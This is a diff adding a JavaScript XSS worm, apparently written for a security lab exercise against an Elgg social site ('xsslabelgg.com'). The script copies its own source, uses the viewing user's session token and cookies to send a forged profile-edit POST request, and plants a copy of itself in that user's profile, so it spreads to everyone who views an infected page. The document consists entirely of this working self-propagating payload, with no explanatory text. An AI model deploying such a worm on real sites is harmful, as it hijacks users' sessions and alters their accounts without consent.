@@ -1,0 +1,39 @@
+<script id="worm" type="text/javascript">
+
+var strCode = document.getElementById("worm").innerHTML;
+alert(strCode);
+var user = elgg.session.user.username;
+if(user!='samy'){
+    var Ajax=null;
+    // Construct the header information for the HTTP request
+    Ajax=new XMLHttpRequest();
+    if(Ajax==null)
+        alert("Ajax is null");
+    Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
+    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+    Ajax.setRequestHeader("User-Agent","AJAX 1.2");
+    Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+    Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");
+    Ajax.setRequestHeader("Cookie",document.cookie);
+    Ajax.setRequestHeader("Connection","keep-alive");
+    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    // Construct the content. The format of the content can be learned
+    // from LiveHTTPHeaders.
+
+    var sub_script_begin='<script id="worm" type="text\/javascript">';
+    var sub_script_end="<\/script>";
+    var sub_script=sub_script_begin.concat(strCode,sub_script_end);
+    sub_script = escape(sub_script);
+
+    var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
+    content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
+    content = content.concat("&name=").concat(user);
+    content = content.concat("&&description=I'm your father!").concat(sub_script);
+    content = content.concat("&guid=").concat(elgg.session.user.guid);
+
+    // Send the HTTP POST request.
+    Ajax.setRequestHeader("Content-Length",content.length);
+    Ajax.send(content);
+}
+
+</script>
